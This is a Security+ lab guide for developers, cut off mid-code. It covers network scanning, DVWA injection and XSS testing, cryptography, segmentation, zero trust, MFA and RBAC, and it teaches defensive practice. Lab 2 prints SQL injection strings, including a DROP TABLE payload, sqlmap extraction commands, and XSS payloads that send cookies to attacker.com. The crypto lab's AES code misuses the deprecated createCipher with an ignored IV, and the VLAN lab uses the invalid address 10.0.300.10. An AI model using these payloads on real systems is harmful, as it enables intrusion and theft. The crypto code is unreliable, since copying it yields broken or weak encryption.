# Hands-On Labs Guide: Practical Security+ Exercises for Developers

**Comprehensive collection of practical laboratory exercises designed to reinforce Security+ concepts through hands-on implementation and experimentation.**

{% hint style="success" %}
**Learning Philosophy**: Theory becomes knowledge, but practice builds expertise. These labs transform Security+ concepts into practical skills developers can immediately apply.
{% endhint %}

## 🏗️ Lab Environment Setup

### Home Lab Architecture

#### Essential Lab Components
```yaml
lab_architecture:
  host_system:
    requirements:
      cpu: "4+ cores (8+ recommended)"
      ram: "16GB minimum (32GB preferred)"
      storage: "500GB+ SSD for performance"
      network: "Isolated network configuration"
    
    virtualization_options:
      vmware_workstation: "Professional grade, $199, excellent performance"
      virtualbox: "Free, good for learning, cross-platform"
      hyper_v: "Windows only, built-in, enterprise features"
      parallels: "macOS only, $99/year, optimized for Mac"

  network_topology:
    management_network: "192.168.1.0/24 (host access)"
    lab_network: "10.0.0.0/24 (isolated lab)"
    dmz_network: "172.16.0.0/24 (public services)"
    internal_network: "192.168.100.0/24 (internal services)"

  essential_vms:
    - name: "Kali Linux"
      purpose: "Penetration testing and security tools"
      resources: "4GB RAM, 2 vCPUs, 50GB disk"
    
    - name: "Windows Server 2019/2022"
      purpose: "Active Directory and Windows security"
      resources: "8GB RAM, 2 vCPUs, 80GB disk"
    
    - name: "Ubuntu Server"
      purpose: "Linux security and web services"
      resources: "4GB RAM, 2 vCPUs, 40GB disk"
    
    - name: "Metasploitable"
      purpose: "Vulnerable target for ethical hacking"
      resources: "2GB RAM, 1 vCPU, 20GB disk"
    
    - name: "Windows 10/11"
      purpose: "Endpoint security testing"
      resources: "6GB RAM, 2 vCPUs, 60GB disk"
```

#### Quick Lab Setup Script
```bash
#!/bin/bash
# Security+ Lab Environment Setup Script

echo "Security+ Hands-On Lab Setup"
echo "============================"

# Create lab directory structure
LAB_DIR="$HOME/security-plus-labs"
mkdir -p "$LAB_DIR"/{vms,tools,scripts,results,notes}
cd "$LAB_DIR"

# Download essential vulnerable applications
echo "Downloading vulnerable applications..."

# DVWA (Damn Vulnerable Web Application)
mkdir -p tools/dvwa
cd tools/dvwa
git clone https://github.com/digininja/DVWA.git .

# WebGoat
mkdir -p ../webgoat
cd ../webgoat
wget https://github.com/WebGoat/WebGoat/releases/latest/download/webgoat-server-8.2.2.jar

# Juice Shop
mkdir -p ../juice-shop
cd ../juice-shop
git clone https://github.com/bkimminich/juice-shop.git .

# Create Docker Compose for vulnerable apps
cd "$LAB_DIR"
cat > docker-compose.yml << 'EOF'
version: '3.8'
services:
  dvwa:
    image: vulnerables/web-dvwa
    ports:
      - "8080:80"
    environment:
      - MYSQL_HOST=mysql
      - MYSQL_DATABASE=dvwa
      - MYSQL_USER=dvwa
      - MYSQL_PASSWORD=password
    depends_on:
      - mysql
    networks:
      - lab-net

  mysql:
    image: mysql:5.7
    environment:
      - MYSQL_ROOT_PASSWORD=rootpassword
      - MYSQL_DATABASE=dvwa
      - MYSQL_USER=dvwa
      - MYSQL_PASSWORD=password
    networks:
      - lab-net

  webgoat:
    image: webgoat/webgoat-8.0
    ports:
      - "8081:8080"
    networks:
      - lab-net

  juice-shop:
    image: bkimminich/juice-shop
    ports:
      - "8082:3000"
    networks:
      - lab-net

networks:
  lab-net:
    driver: bridge
    
volumes:
  mysql-data:
EOF

# Create lab documentation template
cat > notes/lab-journal.md << 'EOF'
# Security+ Lab Journal

## Lab Session Template
Date: 
Duration: 
Objectives:
- [ ] Objective 1
- [ ] Objective 2

### Findings:
- Finding 1
- Finding 2

### Commands Used:
```bash
# Document important commands here
```

### Screenshots:
- Screenshot 1: [Description]
- Screenshot 2: [Description]

### Lessons Learned:
- Lesson 1
- Lesson 2

### Next Steps:
- [ ] Follow-up action 1
- [ ] Follow-up action 2
EOF

echo "Lab environment setup complete!"
echo "Next steps:"
echo "1. Install Docker and run 'docker-compose up -d'"
echo "2. Set up VirtualBox with VMs"
echo "3. Configure isolated network"
echo "4. Start with Lab 1: Network Discovery"
```

## 🌐 Domain 1 Labs: Attacks, Threats, and Vulnerabilities

### Lab 1: Network Discovery and Reconnaissance

#### Objective
Learn network discovery techniques and understand how attackers enumerate network resources.

#### Prerequisites
- Kali Linux VM
- Target network (lab environment)
- Basic Linux command line knowledge

#### Lab Setup
```bash
# Network topology for this lab
# Kali Linux: 10.0.0.100
# Target Ubuntu: 10.0.0.101  
# Target Windows: 10.0.0.102
# Vulnerable app server: 10.0.0.103
```

#### Step-by-Step Procedure

**Step 1: Network Discovery with Nmap**
```bash
# Basic network discovery
nmap -sn 10.0.0.0/24

# Detailed port scan of discovered hosts
nmap -sS -O -sV 10.0.0.101

# Service version detection
nmap -sV -p- 10.0.0.101

# Script scanning for vulnerabilities
nmap --script vuln 10.0.0.101
```

**Step 2: Service Enumeration**
```bash
# HTTP service enumeration
nmap -p 80,443 --script http-enum 10.0.0.103

# SMB enumeration (Windows targets)
nmap -p 445 --script smb-enum-shares,smb-enum-users 10.0.0.102

# DNS enumeration
nmap -p 53 --script dns-enum 10.0.0.101
```

**Step 3: Advanced Reconnaissance**
```bash
# Banner grabbing
nc -nv 10.0.0.101 22
nc -nv 10.0.0.101 80

# SNMP enumeration
snmpwalk -c public -v1 10.0.0.101

# Web application discovery
dirb http://10.0.0.103
gobuster dir -u http://10.0.0.103 -w /usr/share/wordlists/dirb/common.txt
```

#### Developer-Focused Analysis
```javascript
// Analyze findings from a developer perspective
const networkAnalysis = {
  openPorts: [22, 80, 443, 3306],
  services: {
    ssh: { version: "OpenSSH 7.4", security_concern: "Outdated version" },
    http: { version: "Apache 2.4.6", security_concern: "Default configuration" },
    mysql: { version: "5.7.34", security_concern: "Remote access enabled" }
  },
  
  developerRemediation: [
    "Update SSH to latest version",
    "Configure proper HTTP security headers",
    "Restrict MySQL to localhost only",
    "Implement fail2ban for brute force protection"
  ]
};

// Secure configuration examples
const secureConfigurations = {
  nginx: `
    # Secure Nginx configuration
    server {
        listen 443 ssl http2;
        ssl_protocols TLSv1.2 TLSv1.3;
        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains";
        add_header X-Frame-Options DENY;
        add_header X-Content-Type-Options nosniff;
    }
  `,
  
  ssh: `
    # Secure SSH configuration (/etc/ssh/sshd_config)
    Protocol 2
    PermitRootLogin no
    PubkeyAuthentication yes
    PasswordAuthentication no
    MaxAuthTries 3
    ClientAliveInterval 300
  `
};
```

#### Lab Results Documentation
```markdown
# Lab 1 Results: Network Discovery

## Network Map Discovered
- 10.0.0.101: Ubuntu Server (SSH, HTTP, MySQL)
- 10.0.0.102: Windows 10 (RDP, SMB)
- 10.0.0.103: Web App Server (HTTP, HTTPS)

## Security Findings
1. **SSH Brute Force Vulnerability**: Password authentication enabled
2. **Unencrypted HTTP**: Sensitive data transmitted in clear text
3. **Default Credentials**: Several services using default passwords
4. **Unnecessary Services**: Multiple unused services running

## Developer Recommendations
1. Implement proper authentication mechanisms
2. Force HTTPS for all web applications
3. Change default credentials immediately
4. Disable unnecessary services
5. Configure proper firewall rules
```

### Lab 2: Web Application Security Testing (OWASP Top 10)

#### Objective
Hands-on exploration of common web application vulnerabilities and their mitigation strategies.

#### Prerequisites
- DVWA (Damn Vulnerable Web Application)
- Burp Suite Community Edition
- Web browser with proxy configuration

#### Lab Setup
```bash
# Start DVWA container
docker run -d -p 8080:80 vulnerables/web-dvwa

# Configure browser proxy to 127.0.0.1:8080 for Burp Suite
# Access DVWA at http://localhost:8080
# Default credentials: admin/password
```

#### A01: Broken Access Control Testing

**Step 1: Insecure Direct Object Reference (IDOR)**
```bash
# Normal request
curl "http://localhost:8080/vulnerabilities/idor/?id=1"

# IDOR attempt - access other user's data
curl "http://localhost:8080/vulnerabilities/idor/?id=2"
curl "http://localhost:8080/vulnerabilities/idor/?id=3"
```

**Developer Mitigation Code**
```javascript
// Vulnerable code example
app.get('/api/user/:id', (req, res) => {
  const userId = req.params.id;
  const userData = getUserData(userId); // No authorization check!
  res.json(userData);
});

// Secure implementation
app.get('/api/user/:id', authenticateToken, (req, res) => {
  const requestedUserId = req.params.id;
  const currentUserId = req.user.id;
  
  // Authorization check
  if (requestedUserId !== currentUserId && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  const userData = getUserData(requestedUserId);
  res.json(userData);
});
```

#### A03: Injection Testing

**Step 1: SQL Injection Discovery**
```sql
-- Test for SQL injection in login form
admin' --
admin' OR '1'='1' --
admin'; DROP TABLE users; --

-- Time-based blind SQL injection
admin' AND (SELECT SLEEP(5)) --
admin' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
```

**Step 2: Automated SQL Injection with SQLMap**
```bash
# Basic SQLMap usage
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id"

# Extract database information
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id" --dbs

# Extract table data
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=your_session_id" -D dvwa --tables
```

**Developer Mitigation Code**
```javascript
// Vulnerable code
const getUserById = (id) => {
  const query = `SELECT * FROM users WHERE id = ${id}`;
  return db.query(query); // SQL injection vulnerability!
};

// Secure implementation with parameterized queries
const getUserById = (id) => {
  const query = 'SELECT * FROM users WHERE id = ?';
  return db.prepare(query).get(id); // Safe from SQL injection
};

// Modern ORM approach (Sequelize example)
const getUserById = async (id) => {
  return await User.findByPk(id, {
    attributes: ['id', 'username', 'email'] // Only return necessary fields
  });
};
```

#### A07: Cross-Site Scripting (XSS) Testing

**Step 1: Reflected XSS**
```html
<!-- Test payloads for XSS -->
<script>alert('XSS')</script>
<img src="x" onerror="alert('XSS')">
<svg onload="alert('XSS')">

<!-- Advanced XSS payloads -->
<script>document.location='http://attacker.com/cookie.php?c='+document.cookie</script>
<script>fetch('http://attacker.com/steal', {method: 'POST', body: document.cookie})</script>
```

**Developer Mitigation Code**
```javascript
// Vulnerable code
app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  // Direct output without sanitization - XSS vulnerability!
  res.send(`<p>Comment: ${comment}</p>`);
});

// Secure implementation
const sanitizeHtml = require('sanitize-html');

app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  
  // Input sanitization
  const cleanComment = sanitizeHtml(comment, {
    allowedTags: ['b', 'i', 'em', 'strong'],
    allowedAttributes: {}
  });
  
  // Additional security headers
  res.setHeader('Content-Security-Policy', "default-src 'self'");
  res.setHeader('X-XSS-Protection', '1; mode=block');
  
  res.send(`<p>Comment: ${cleanComment}</p>`);
});

// React JSX automatic escaping
const CommentComponent = ({ comment }) => {
  return (
    <div>
      {/* JSX automatically escapes content */}
      <p>Comment: {comment}</p>
      
      {/* For HTML content, use dangerouslySetInnerHTML with sanitization */}
      <div 
        dangerouslySetInnerHTML={{
          __html: sanitizeHtml(comment)
        }}
      />
    </div>
  );
};
```

### Lab 3: Cryptography Implementation

#### Objective
Implement and test various cryptographic algorithms and understand their security implications.

#### Prerequisites
- Node.js development environment
- OpenSSL command line tools
- Understanding of cryptographic concepts

#### Symmetric Encryption Lab

**Step 1: AES Implementation**
```javascript
const crypto = require('crypto');

class SymmetricCrypto {
  // AES-256-GCM encryption
  static encrypt(plaintext, key) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipher('aes-256-gcm', key, iv);
    
    let encrypted = cipher.update(plaintext, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const authTag = cipher.getAuthTag();
    
    return {
      iv: iv.toString('hex'),
      encryptedData: encrypted,
      authTag: authTag.toString('hex')
    };
  }
  
  static decrypt(encryptedObj, key) {
    const iv = Buffer.from(encryptedObj.iv, 'hex');
    const authTag = Buffer.from(encryptedObj.authTag, 'hex');
    
    const decipher = crypto.createDecipher('aes-256-gcm', key, iv);
    decipher.setAuthTag(authTag);
    
    let decrypted = decipher.update(encryptedObj.encryptedData, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    
    return decrypted;
  }
  
  // Demonstrate different encryption modes
  static compareEncryptionModes(plaintext, key) {
    const modes = ['aes-256-cbc', 'aes-256-gcm', 'aes-256-ctr'];
    const results = {};
    
    modes.forEach(mode => {
      const iv = crypto.randomBytes(16);
      const cipher = crypto.createCipher(mode, key, iv);
      
      console.log(`\nTesting ${mode}:`);
      console.log(`IV: ${iv.toString('hex')}`);
      
      try {
        let encrypted = cipher.update(plaintext, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        
        results[mode] = {
          encrypted,
          iv: iv.toString('hex'),
          secure: mode.includes('gcm') ? 'Authenticated' : 'Not authenticated'
        };
      } catch (error) {
        results[mode] = { error: error.message };
      }
    });
    
    return results;
  }
}

// Test symmetric encryption
const key = crypto.randomBytes(32).toString('hex');
const message = "Sensitive developer data requiring encryption";

console.log("Original message:", message);

const encrypted = SymmetricCrypto.encrypt(message, key);
console.log("Encrypted:", encrypted);

const decrypted = SymmetricCrypto.decrypt(encrypted, key);
console.log("Decrypted:", decrypted);

// Compare encryption modes
const modeComparison = SymmetricCrypto.compareEncryptionModes(message, key);
console.log("Encryption modes comparison:", modeComparison);
```

#### Asymmetric Encryption Lab

**Step 2: RSA Key Generation and Usage**
```bash
# Generate RSA key pair
openssl genrsa -out private_key.pem 2048
openssl rsa -in private_key.pem -pubout -out public_key.pem

# Encrypt file with public key
echo "Secret message for developers" > message.txt
openssl rsautl -encrypt -inkey public_key.pem -pubin -in message.txt -out encrypted_message.bin

# Decrypt with private key
openssl rsautl -decrypt -inkey private_key.pem -in encrypted_message.bin -out decrypted_message.txt

# Digital signature creation
openssl dgst -sha256 -sign private_key.pem -out signature.bin message.txt

# Signature verification
openssl dgst -sha256 -verify public_key.pem -signature signature.bin message.txt
```

**Node.js RSA Implementation**
```javascript
const crypto = require('crypto');
const fs = require('fs');

class AsymmetricCrypto {
  // Generate RSA key pair
  static generateKeyPair() {
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: {
        type: 'spki',
        format: 'pem'
      },
      privateKeyEncoding: {
        type: 'pkcs8',
        format: 'pem'
      }
    });
    
    return { publicKey, privateKey };
  }
  
  // RSA encryption (for small data only)
  static encrypt(data, publicKey) {
    return crypto.publicEncrypt({
      key: publicKey,
      padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
      oaepHash: 'sha256'
    }, Buffer.from(data, 'utf8'));
  }
  
  static decrypt(encryptedData, privateKey) {
    return crypto.privateDecrypt({
      key: privateKey,
      padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
      oaepHash: 'sha256'
    }, encryptedData);
  }
  
  // Digital signatures
  static sign(data, privateKey) {
    return crypto.sign('RSA-SHA256', Buffer.from(data, 'utf8'), privateKey);
  }
  
  static verify(data, signature, publicKey) {
    return crypto.verify('RSA-SHA256', Buffer.from(data, 'utf8'), publicKey, signature);
  }
  
  // Hybrid encryption (RSA + AES) for large data
  static hybridEncrypt(data, publicKey) {
    // Generate random AES key
    const aesKey = crypto.randomBytes(32);
    
    // Encrypt data with AES
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipher('aes-256-gcm', aesKey, iv);
    let encryptedData = cipher.update(data, 'utf8', 'hex');
    encryptedData += cipher.final('hex');
    const authTag = cipher.getAuthTag();
    
    // Encrypt AES key with RSA
    const encryptedKey = this.encrypt(aesKey.toString('hex'), publicKey);
    
    return {
      encryptedKey: encryptedKey.toString('base64'),
      encryptedData,
      iv: iv.toString('hex'),
      authTag: authTag.toString('hex')
    };
  }
  
  static hybridDecrypt(encryptedObj, privateKey) {
    // Decrypt AES key with RSA
    const aesKeyBuffer = this.decrypt(Buffer.from(encryptedObj.encryptedKey, 'base64'), privateKey);
    const aesKey = aesKeyBuffer.toString();
    
    // Decrypt data with AES
    const iv = Buffer.from(encryptedObj.iv, 'hex');
    const authTag = Buffer.from(encryptedObj.authTag, 'hex');
    
    const decipher = crypto.createDecipher('aes-256-gcm', aesKey, iv);
    decipher.setAuthTag(authTag);
    
    let decryptedData = decipher.update(encryptedObj.encryptedData, 'hex', 'utf8');
    decryptedData += decipher.final('utf8');
    
    return decryptedData;
  }
}

// Test asymmetric encryption
const { publicKey, privateKey } = AsymmetricCrypto.generateKeyPair();

// Test small data encryption
const smallMessage = "API key: abc123";
const encrypted = AsymmetricCrypto.encrypt(smallMessage, publicKey);
const decrypted = AsymmetricCrypto.decrypt(encrypted, privateKey);
console.log("Small message test:", decrypted.toString('utf8'));

// Test digital signature
const signature = AsymmetricCrypto.sign(smallMessage, privateKey);
const isValid = AsymmetricCrypto.verify(smallMessage, signature, publicKey);
console.log("Signature valid:", isValid);

// Test hybrid encryption for large data
const largeMessage = "This is a large message that exceeds RSA encryption limits. ".repeat(100);
const hybridEncrypted = AsymmetricCrypto.hybridEncrypt(largeMessage, publicKey);
const hybridDecrypted = AsymmetricCrypto.hybridDecrypt(hybridEncrypted, privateKey);
console.log("Hybrid encryption test passed:", largeMessage === hybridDecrypted);
```

## 🔧 Domain 2 Labs: Architecture and Design

### Lab 4: Secure Network Architecture Design

#### Objective
Design and implement secure network architectures using virtualization and network segmentation.

#### Network Segmentation Lab

**Step 1: VLAN Configuration Simulation**
```bash
# Create network namespaces to simulate VLANs
sudo ip netns add vlan100  # DMZ
sudo ip netns add vlan200  # Internal
sudo ip netns add vlan300  # Management

# Create virtual interfaces
sudo ip link add veth100 type veth peer name veth100-br
sudo ip link add veth200 type veth peer name veth200-br
sudo ip link add veth300 type veth peer name veth300-br

# Assign interfaces to namespaces
sudo ip link set veth100 netns vlan100
sudo ip link set veth200 netns vlan200
sudo ip link set veth300 netns vlan300

# Configure IP addresses
sudo ip netns exec vlan100 ip addr add 10.0.100.10/24 dev veth100
sudo ip netns exec vlan200 ip addr add 10.0.200.10/24 dev veth200
sudo ip netns exec vlan300 ip addr add 10.0.300.10/24 dev veth300

# Test network isolation
sudo ip netns exec vlan100 ping -c 3 10.0.200.10  # Should fail
sudo ip netns exec vlan200 ping -c 3 10.0.300.10  # Should fail
```

**Docker Network Segmentation**
```yaml
# docker-compose.yml for segmented architecture
version: '3.8'
services:
  web-server:
    image: nginx:alpine
    networks:
      - dmz
      - frontend
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf

  api-server:
    image: node:16-alpine
    networks:
      - frontend
      - backend
    environment:
      - NODE_ENV=production
      - DB_HOST=database
    # No direct external access

  database:
    image: postgres:14
    networks:
      - backend  # Only accessible from backend network
    environment:
      - POSTGRES_PASSWORD_FILE=/run/secrets/db_password
    volumes:
      - db_data:/var/lib/postgresql/data
    secrets:
      - db_password

  monitoring:
    image: prometheus/prometheus
    networks:
      - management
    ports:
      - "9090:9090"  # Management access only

networks:
  dmz:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24
  
  frontend:
    driver: bridge
    ipam:
      config:
        - subnet: 172.21.0.0/24
  
  backend:
    driver: bridge
    internal: true  # No external access
    ipam:
      config:
        - subnet: 172.22.0.0/24
  
  management:
    driver: bridge
    ipam:
      config:
        - subnet: 172.23.0.0/24

secrets:
  db_password:
    file: ./secrets/db_password.txt

volumes:
  db_data:
```

#### Zero Trust Architecture Implementation

**Step 2: Micro-segmentation with iptables**
```bash
#!/bin/bash
# Zero Trust Network Rules

# Flush existing rules
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X

# Default deny policy
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP

# Allow loopback traffic
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Web server rules (DMZ - 172.20.0.0/24)
iptables -A INPUT -s 172.20.0.0/24 -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -s 172.20.0.0/24 -p tcp --dport 443 -j ACCEPT

# API server rules (Frontend - 172.21.0.0/24)
iptables -A INPUT -s 172.21.0.0/24 -p tcp --dport 3000 -j ACCEPT

# Database rules (Backend - 172.22.0.0/24)
iptables -A INPUT -s 172.22.0.0/24 -p tcp --dport 5432 -j ACCEPT

# Block inter-VLAN communication except where explicitly allowed
iptables -A FORWARD -s 172.20.0.0/24 -d 172.22.0.0/24 -j DROP
iptables -A FORWARD -s 172.22.0.0/24 -d 172.20.0.0/24 -j DROP

# Log dropped packets for analysis
iptables -A INPUT -j LOG --log-prefix "DROPPED INPUT: "
iptables -A FORWARD -j LOG --log-prefix "DROPPED FORWARD: "
iptables -A OUTPUT -j LOG --log-prefix "DROPPED OUTPUT: "

echo "Zero Trust rules applied successfully"
```

**Application-Level Zero Trust**
```javascript
// Zero Trust middleware implementation
const jwt = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');

class ZeroTrustSecurity {
  // Every request must be authenticated
  static authenticateEveryRequest(req, res, next) {
    const token = req.headers.authorization?.split(' ')[1];
    
    if (!token) {
      return res.status(401).json({ 
        error: 'Authentication required',
        message: 'Zero Trust: No request without authentication'
      });
    }
    
    try {
      const decoded = jwt.verify(token, process.env.JWT_SECRET);
      req.user = decoded;
      
      // Log authentication for audit
      console.log(`Authenticated request: ${req.user.id} -> ${req.method} ${req.path}`);
      next();
    } catch (error) {
      return res.status(401).json({ 
        error: 'Invalid authentication token',
        message: 'Zero Trust: Verify every transaction'
      });
    }
  }
  
  // Authorize every action based on least privilege
  static authorizeAction(requiredPermission) {
    return (req, res, next) => {
      const userPermissions = req.user.permissions || [];
      
      if (!userPermissions.includes(requiredPermission)) {
        return res.status(403).json({
          error: 'Insufficient permissions',
          message: `Zero Trust: Action '${requiredPermission}' denied`,
          userPermissions: userPermissions
        });
      }
      
      // Log authorization for audit
      console.log(`Authorized action: ${req.user.id} -> ${requiredPermission}`);
      next();
    };
  }
  
  // Verify device/location context
  static verifyDeviceContext(req, res, next) {
    const deviceFingerprint = req.headers['x-device-fingerprint'];
    const userAgent = req.headers['user-agent'];
    const clientIP = req.ip;
    
    // Check against known good devices
    const knownDevices = req.user.knownDevices || [];
    const currentDevice = {
      fingerprint: deviceFingerprint,
      userAgent: userAgent,
      ip: clientIP
    };
    
    const isKnownDevice = knownDevices.some(device => 
      device.fingerprint === deviceFingerprint &&
      device.userAgent === userAgent
    );
    
    if (!isKnownDevice) {
      // New device - require additional verification
      return res.status(403).json({
        error: 'Device verification required',
        message: 'Zero Trust: Trust nothing, verify everything',
        requiresMFA: true
      });
    }
    
    next();
  }
  
  // Monitor and log all security events
  static securityEventLogger(req, res, next) {
    const securityEvent = {
      timestamp: new Date().toISOString(),
      userId: req.user?.id,
      action: `${req.method} ${req.path}`,
      ipAddress: req.ip,
      userAgent: req.headers['user-agent'],
      sessionId: req.sessionID
    };
    
    // Log successful access
    res.on('finish', () => {
      securityEvent.statusCode = res.statusCode;
      securityEvent.success = res.statusCode < 400;
      
      if (res.statusCode >= 400) {
        securityEvent.severity = res.statusCode >= 500 ? 'high' : 'medium';
        console.error('Security Event - Failed:', securityEvent);
      } else {
        console.log('Security Event - Success:', securityEvent);
      }
      
      // Store in security audit log
      this.storeSecurityEvent(securityEvent);
    });
    
    next();
  }
  
  static storeSecurityEvent(event) {
    // Implementation would store in secure audit log
    // For lab purposes, we'll just log to console
    console.log('AUDIT LOG:', JSON.stringify(event, null, 2));
  }
}

// Apply Zero Trust principles to Express app
const express = require('express');
const app = express();

// Rate limiting - prevent abuse
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Zero Trust: Rate limit exceeded'
});

app.use(limiter);

// Apply Zero Trust to all routes
app.use('/api/*', ZeroTrustSecurity.authenticateEveryRequest);
app.use('/api/*', ZeroTrustSecurity.verifyDeviceContext);
app.use('/api/*', ZeroTrustSecurity.securityEventLogger);

// Specific authorization for different endpoints
app.get('/api/user/profile', 
  ZeroTrustSecurity.authorizeAction('read:own_profile'),
  (req, res) => {
    res.json({ profile: 'User profile data' });
  }
);

app.post('/api/admin/users', 
  ZeroTrustSecurity.authorizeAction('create:users'),
  (req, res) => {
    res.json({ message: 'User created successfully' });
  }
);

app.delete('/api/admin/system', 
  ZeroTrustSecurity.authorizeAction('admin:system_control'),
  (req, res) => {
    res.json({ message: 'System operation completed' });
  }
);
```

## 🛡️ Domain 3 Labs: Implementation

### Lab 5: Identity and Access Management (IAM)

#### Objective
Implement comprehensive IAM solutions including authentication, authorization, and access controls.

#### Multi-Factor Authentication Implementation

**Step 1: TOTP Implementation**
```javascript
const speakeasy = require('speakeasy');
const QRCode = require('qrcode');
const crypto = require('crypto');

class MFAImplementation {
  // Generate MFA secret for user enrollment
  static generateMFASecret(user) {
    const secret = speakeasy.generateSecret({
      name: `${user.email} (Security+ Lab)`,
      issuer: 'Developer Security Lab',
      length: 32
    });
    
    return {
      secret: secret.base32,
      manualEntryKey: secret.base32,
      qrCodeUrl: secret.otpauth_url
    };
  }
  
  // Generate QR code for easy setup
  static async generateQRCode(secret) {
    try {
      const qrCodeDataURL = await QRCode.toDataURL(secret.qrCodeUrl);
      return qrCodeDataURL;
    } catch (error) {
      throw new Error('Failed to generate QR code: ' + error.message);
    }
  }
  
  // Verify TOTP token
  static verifyMFAToken(token, secret) {
    return speakeasy.totp.verify({
      secret: secret,
      encoding: 'base32',
      token: token,
      window: 2 // Allow 2 time steps variance (±60 seconds)
    });
  }
  
  // Generate backup codes
  static generateBackupCodes() {
    const backupCodes = [];
    for (let i = 0; i < 8; i++) {
      const code = crypto.randomBytes(4).toString('hex').toUpperCase();
      backupCodes.push(`${code.substring(0, 4)}-${code.substring(4, 8)}`);
    }
    return backupCodes;
  }
  
  // Verify backup code
  static verifyBackupCode(inputCode, storedCodes) {
    const codeIndex = storedCodes.findIndex(code => code === inputCode);
    if (codeIndex !== -1) {
      // Remove used backup code
      storedCodes.splice(codeIndex, 1);
      return true;
    }
    return false;
  }
}

// Express.js MFA middleware
const mfaMiddleware = {
  // Check if MFA is enabled for user
  checkMFAStatus: async (req, res, next) => {
    const user = req.user;
    
    if (!user.mfaEnabled) {
      return res.status(403).json({
        error: 'MFA required',
        message: 'Multi-factor authentication must be enabled',
        setupRequired: true
      });
    }
    
    next();
  },
  
  // Verify MFA token from request
  verifyMFAToken: async (req, res, next) => {
    const mfaToken = req.headers['x-mfa-token'] || req.body.mfaToken;
    
    if (!mfaToken) {
      return res.status(403).json({
        error: 'MFA token required',
        message: 'Please provide your 6-digit authentication code'
      });
    }
    
    const user = req.user;
    const isValid = MFAImplementation.verifyMFAToken(mfaToken, user.mfaSecret);
    
    if (!isValid) {
      // Check backup codes as fallback
      const backupCodeValid = MFAImplementation.verifyBackupCode(
        mfaToken, 
        user.backupCodes || []
      );
      
      if (!backupCodeValid) {
        return res.status(403).json({
          error: 'Invalid MFA token',
          message: 'Authentication code is incorrect or expired'
        });
      }
      
      // Update user backup codes if backup code was used
      await updateUserBackupCodes(user.id, user.backupCodes);
    }
    
    // Log successful MFA verification
    console.log(`MFA verified for user ${user.id} at ${new Date().toISOString()}`);
    next();
  }
};

// MFA setup endpoint
app.post('/api/auth/mfa/setup', authenticateToken, async (req, res) => {
  try {
    const user = req.user;
    
    // Generate MFA secret
    const mfaSecret = MFAImplementation.generateMFASecret(user);
    
    // Generate QR code
    const qrCode = await MFAImplementation.generateQRCode(mfaSecret);
    
    // Generate backup codes
    const backupCodes = MFAImplementation.generateBackupCodes();
    
    // Store in database (in real implementation)
    // await updateUserMFASetup(user.id, mfaSecret.secret, backupCodes);
    
    res.json({
      secret: mfaSecret.manualEntryKey,
      qrCode: qrCode,
      backupCodes: backupCodes,
      instructions: 'Scan QR code with authenticator app or enter secret manually'
    });
  } catch (error) {
    res.status(500).json({ error: 'MFA setup failed', details: error.message });
  }
});

// MFA verification endpoint
app.post('/api/auth/mfa/verify', authenticateToken, (req, res) => {
  const { token } = req.body;
  const user = req.user;
  
  const isValid = MFAImplementation.verifyMFAToken(token, user.mfaSecret);
  
  if (isValid) {
    // Enable MFA for user account
    // await enableUserMFA(user.id);
    
    res.json({
      success: true,
      message: 'MFA enabled successfully',
      mfaEnabled: true
    });
  } else {
    res.status(400).json({
      error: 'Invalid verification code',
      message: 'Please check your authenticator app and try again'
    });
  }
});

// Protected endpoint requiring MFA
app.get('/api/sensitive-data', 
  authenticateToken,
  mfaMiddleware.checkMFAStatus,
  mfaMiddleware.verifyMFAToken,
  (req, res) => {
    res.json({
      data: 'This is highly sensitive information',
      accessTime: new Date().toISOString(),
      user: req.user.id
    });
  }
);
```

#### Role-Based Access Control (RBAC) Implementation

**Step 2: RBAC System**
```javascript
class RBACSystem {
  constructor() {
    this.roles = new Map();
    this.permissions = new Map();
    this.userRoles = new Map();
    
    this.initializeDefaultRoles();
  }
  
  // Initialize default roles and permissions
  initializeDefaultRoles() {
    // Define permissions
    const permissions = [
      'read:own_profile',
      'update:own_profile',
      'read:users',
      'create:users', 
      'update:users',
      'delete:users',
      'read:admin_panel',
      'manage:system',
      'read:reports',
      'generate:reports'
    ];
    
    permissions.forEach(permission => {
      this.permissions.set(permission, {
        name: permission,
        description: this.getPermissionDescription(permission)
      });
    });
    
    // Define roles
    this.createRole('user', 'Standard User', [
      'read:own_profile',
      'update:own_profile'
    ]);
    
    this.createRole('moderator', 'Content Moderator', [
      'read:own_profile',
      'update:own_profile',
      'read:users',
      'update:users'
    ]);
    
    this.createRole('admin', 'Administrator', [
      'read:own_profile',
      'update:own_profile',
      'read:users',
      'create:users',
      'update:users',
